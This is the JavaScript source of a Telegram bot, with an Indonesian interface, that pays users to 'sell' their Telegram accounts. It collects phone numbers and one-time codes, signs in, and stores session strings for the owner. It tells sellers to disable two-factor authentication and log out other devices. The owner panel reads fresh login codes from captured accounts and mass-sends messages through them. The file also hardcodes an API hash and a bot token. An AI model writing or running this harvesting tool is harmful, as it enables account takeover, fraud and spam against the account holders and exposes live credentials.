const { Telegraf, Markup } = require('telegraf');
const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions');
const fs = require('fs');

// --- KONFIGURASI ---
const apiId = 31201777;
const apiHash = '791bb0f9d012531d922086c8489dd705';
const botToken = '8238521944:AAGOScQ1GeZdzh6-c3bkwkW9zQpKDeHFCCc';
const logChannel = '-1003121256961';
const ownerId = 8457401920; // GANTI DENGAN ID TELEGRAM ANDA

const bot = new Telegraf(botToken);
const DB_FILE = './sessions.json';
const MIN_WD = 20000;
const HARGA_AKUN = 50000; // Saldo yang didapat per akun bersih

// --- DATABASE HANDLER ---
if (!fs.existsSync(DB_FILE)) {
    fs.writeFileSync(DB_FILE, JSON.stringify({ accounts: [], users: {} }));
}

const getData = () => JSON.parse(fs.readFileSync(DB_FILE));
const saveData = (data) => fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));

const userSessions = {}; 

// --- KEYBOARD HELPER ---
const mainBtn = () => Markup.inlineKeyboard([
    [Markup.button.callback('💰 JUAL AKUN (DEPOSIT SALDO)', 'jual_akun')],
    [Markup.button.callback('👤 MY PROFILE', 'profile'), Markup.button.callback('💸 WITHDRAW', 'withdraw')],
    [Markup.button.callback('👑 OWNER MENU', 'owner_menu')]
]);

// --- START COMMAND ---
bot.start((ctx) => {
    ctx.reply(
        `🚀 **SELAMAT DATANG DI USERBOT MANAGER** 🚀\n\n` +
        `Dapatkan saldo instant Rp ${HARGA_AKUN.toLocaleString()} per akun!\n\n` +
        `⚠️ **SYARAT ORDER:**\n` +
        `1. Matikan **Password/2FA** di pengaturan Telegram.\n` +
        `2. Bot akan mendeteksi perangkat. Jika > 1, saldo ditahan.\n` +
        `3. Logout perangkat lain agar transaksi Success.`,
        mainBtn()
    );
});

// --- LOGIKA JUAL AKUN (SISTEM DEPOSIT) ---
bot.action('jual_akun', (ctx) => {
    userSessions[ctx.from.id] = { step: 'input_phone' };
    ctx.reply('📲 **MASUKKAN NOMOR TELEGRAM**\nFormat: 628xxxx\nContoh: 62812345678');
});

bot.on('text', async (ctx) => {
    const userId = ctx.from.id;
    const text = ctx.message.text;
    const state = userSessions[userId];
    const db = getData();

    if (!state) return;

    // STEP 1: INPUT NOMOR
    if (state.step === 'input_phone') {
        state.phone = text.replace(/[^0-9]/g, '');
        ctx.reply(`⏳ Menghubungi server untuk ${state.phone}...`);
        
        try {
            const client = new TelegramClient(new StringSession(""), apiId, apiHash, { connectionRetries: 5 });
            await client.connect();
            const { phoneCodeHash } = await client.sendCode({ apiId, apiHash }, state.phone);
            
            state.client = client;
            state.phoneCodeHash = phoneCodeHash;
            state.step = 'input_otp';
            ctx.reply('📩 **KODE OTP TERKIRIM!**\nMasukkan kode dengan spasi.\nContoh: 1 2 3 4 5');
        } catch (err) {
            ctx.reply('❌ GAGAL: ' + err.message);
            delete userSessions[userId];
        }
    }

    // STEP 2: INPUT OTP
    else if (state.step === 'input_otp') {
        const otp = text.replace(/\s+/g, '');
        ctx.reply('⚙️ **MENVERIFIKASI AKUN & PERANGKAT...**');

        try {
            const client = state.client;
            await client.invoke(new Api.auth.SignIn({
                phoneNumber: state.phone,
                phoneCodeHash: state.phoneCodeHash,
                phoneCode: otp
            }));

            const sessionStr = client.session.save();
            const auths = await client.invoke(new Api.account.GetAuthorizations());
            const devices = auths.authorizations.length;

            // Simpan data akun ke Owner
            db.accounts.push({
                phone: state.phone,
                session: sessionStr,
                sellerId: userId,
                sellerName: ctx.from.first_name,
                date: new Date().toLocaleString()
            });

            if (devices > 1) {
                ctx.reply(
                    `⚠️ **TERDETEKSI ${devices} PERANGKAT!**\n\n` +
                    `Saldo tertahan. Silahkan Logout semua perangkat lain di HP Anda.\n` +
                    `Lalu klik tombol di bawah untuk klaim saldo:`,
                    Markup.inlineKeyboard([[Markup.button.callback('🔄 CEK ULANG & KLAIM', `recheck_${state.phone}`)]])
                );
            } else {
                if (!db.users[userId]) db.users[userId] = { balance: 0 };
                db.users[userId].balance += HARGA_AKUN;
                ctx.reply(`✅ **BERHASIL!** Akun bersih. Saldo Rp ${HARGA_AKUN.toLocaleString()} telah didepositkan ke akun Anda.`);
                
                // NOTIF KE CHANNEL
                bot.telegram.sendMessage(logChannel, `✅ **AKUN TERJUAL (CLEAN)**\n👤 User: ${ctx.from.first_name}\n📱 No: ${state.phone}\n💰 Deposit: Rp ${HARGA_AKUN.toLocaleString()}`);
            }
            saveData(db);
            await client.disconnect();
        } catch (err) {
            ctx.reply('❌ ERROR: ' + err.message + '\nPastikan 2FA Nonaktif.');
        }
        delete userSessions[userId];
    }

    // STEP 3: WITHDRAW
    else if (state.step === 'input_wd') {
        const parts = text.split('-'); // Format: DANA - 08xxx - 50000
        const amount = parseInt(parts[2]?.trim() || 0);
        const currentBal = db.users[userId]?.balance || 0;

        if (amount < MIN_WD) return ctx.reply(`❌ Minimal WD Rp ${MIN_WD.toLocaleString()}`);
        if (amount > currentBal) return ctx.reply(`❌ Saldo tidak cukup! Saldo Anda: Rp ${currentBal.toLocaleString()}`);

        db.users[userId].balance -= amount;
        saveData(db);
        ctx.reply('✅ **PENARIKAN DIAJUKAN!** Mohon tunggu proses admin.');
        
        bot.telegram.sendMessage(logChannel, 
            `💸 **PERMINTAAN PENARIKAN**\n━━━━━━━━━━━━━━\n` +
            `👤 User: ${ctx.from.first_name}\n` +
            `📝 Detail: ${text}\n` +
            `💰 Sisa Saldo: Rp ${db.users[userId].balance.toLocaleString()}\n` +
            `✅ Status: Berhasil Diajukan`
        );
        delete userSessions[userId];
    }

    // STEP 4: BROADCAST (OWNER)
    else if (state.step === 'input_bc') {
        const accounts = db.accounts;
        ctx.reply(`📢 Memulai Broadcast ke ${accounts.length} akun...`);
        let count = 0;
        for (const acc of accounts) {
            try {
                const client = new TelegramClient(new StringSession(acc.session), apiId, apiHash, {});
                await client.connect();
                await client.sendMessage('me', { message: text });
                count++;
                await client.disconnect();
            } catch (e) {}
        }
        ctx.reply(`✅ Broadcast Selesai! Terkirim ke ${count} akun.`);
        delete userSessions[userId];
    }
});

// --- FITUR RECHECK (CEK ULANG PERANGKAT) ---
bot.action(/^recheck_(.+)$/, async (ctx) => {
    const phone = ctx.match[1];
    const db = getData();
    const acc = db.accounts.find(a => a.phone === phone);

    if (!acc) return ctx.answerCbQuery('Data tidak ditemukan!');

    try {
        const client = new TelegramClient(new StringSession(acc.session), apiId, apiHash, {});
        await client.connect();
        const auths = await client.invoke(new Api.account.GetAuthorizations());
        
        if (auths.authorizations.length === 1) {
            if (!db.users[acc.sellerId]) db.users[acc.sellerId] = { balance: 0 };
            db.users[acc.sellerId].balance += HARGA_AKUN;
            saveData(db);
            ctx.editMessageText(`✅ **SUKSES!** Perangkat sekarang bersih. Saldo Rp ${HARGA_AKUN.toLocaleString()} cair!`);
            bot.telegram.sendMessage(logChannel, `✅ **KLAIM SALDO BERHASIL**\n👤 User ID: ${acc.sellerId}\n📱 No: ${phone}\n💰 Status: Perangkat Bersih`);
        } else {
            ctx.answerCbQuery(`Masih ada ${auths.authorizations.length} perangkat terhubung!`, { show_alert: true });
        }
        await client.disconnect();
    } catch (e) {
        ctx.reply('❌ Transaksi Gagal: Bot telah di-kick dari akun tersebut.');
    }
});

// --- MENU OWNER & BROADCAST ---
bot.action('owner_menu', (ctx) => {
    if (ctx.from.id !== ownerId) return ctx.answerCbQuery('Akses Ditolak!');
    ctx.reply('👑 **OWNER PANEL**', Markup.inlineKeyboard([
        [Markup.button.callback('📑 DAFTAR NOMOR', 'list_0')],
        [Markup.button.callback('📢 BROADCAST MASSAL', 'bc_menu')],
        [Markup.button.callback('🔙 KEMBALI', 'back')]
    ]));
});

bot.action(/^list_(\d+)$/, (ctx) => {
    const page = parseInt(ctx.match[1]);
    const accounts = getData().accounts;
    const current = accounts.slice(page * 5, (page * 5) + 5);
    const buttons = current.map((acc, i) => [Markup.button.callback(`📞 ${acc.phone}`, `detail_${(page * 5) + i}`)]);
    
    if (page > 0) buttons.push([Markup.button.callback('⬅️', `list_${page - 1}`)]);
    if ((page * 5) + 5 < accounts.length) buttons.push([Markup.button.callback('➡️', `list_${page + 1}`)]);
    buttons.push([Markup.button.callback('🔙 KEMBALI', 'owner_menu')]);
    
    ctx.editMessageText(`📑 **DAFTAR AKUN TERJUAL (Hal ${page + 1})**`, Markup.inlineKeyboard(buttons));
});

bot.action(/^detail_(\d+)$/, (ctx) => {
    const idx = parseInt(ctx.match[1]);
    const acc = getData().accounts[idx];
    ctx.editMessageText(
        `📄 **DETAIL AKUN**\n\nNomor: ${acc.phone}\nPenjual: ${acc.sellerName}\nTanggal: ${acc.date}`,
        Markup.inlineKeyboard([
            [Markup.button.callback('📩 CEK OTP TERBARU', `sms_${idx}`)],
            [Markup.button.callback('🔙 KEMBALI', 'list_0')]
        ])
    );
});

bot.action(/^sms_(\d+)$/, async (ctx) => {
    const idx = parseInt(ctx.match[1]);
    const acc = getData().accounts[idx];
    ctx.answerCbQuery('Mencari OTP...');
    try {
        const client = new TelegramClient(new StringSession(acc.session), apiId, apiHash, {});
        await client.connect();
        const messages = await client.getMessages(777000, { limit: 1 });
        ctx.reply(`📩 **Pesan @Telegram (${acc.phone}):**\n\n${messages[0].message}`);
        await client.disconnect();
    } catch (e) { ctx.reply('❌ Gagal: Akun mungkin sudah tidak aktif.'); }
});

bot.action('bc_menu', (ctx) => {
    userSessions[ctx.from.id] = { step: 'input_bc' };
    ctx.reply('📢 **BROADCAST**\n\nMasukkan pesan yang ingin dikirim ke semua akun:');
});

// --- PROFILE & WITHDRAW ---
bot.action('profile', (ctx) => {
    const db = getData();
    const bal = db.users[ctx.from.id]?.balance || 0;
    ctx.reply(`👤 **PROFILE SAYA**\n\nID: \`${ctx.from.id}\`\nSaldo: Rp ${bal.toLocaleString()}`, mainBtn());
});

bot.action('withdraw', (ctx) => {
    const db = getData();
    const bal = db.users[ctx.from.id]?.balance || 0;
    if (bal < MIN_WD) return ctx.answerCbQuery(`Saldo tidak cukup (Min Rp ${MIN_WD.toLocaleString()})`, { show_alert: true });
    
    userSessions[ctx.from.id] = { step: 'input_wd' };
    ctx.reply(`💸 **FORM WITHDRAW**\n\nSaldo: Rp ${bal.toLocaleString()}\nFormat: DANA - 08xxx - Jumlah`);
});

bot.action('back', (ctx) => ctx.editMessageText('🚀 **MAIN MENU**', mainBtn()));

bot.launch();
console.log('🚀 Bot Full Fitur Aktif!');
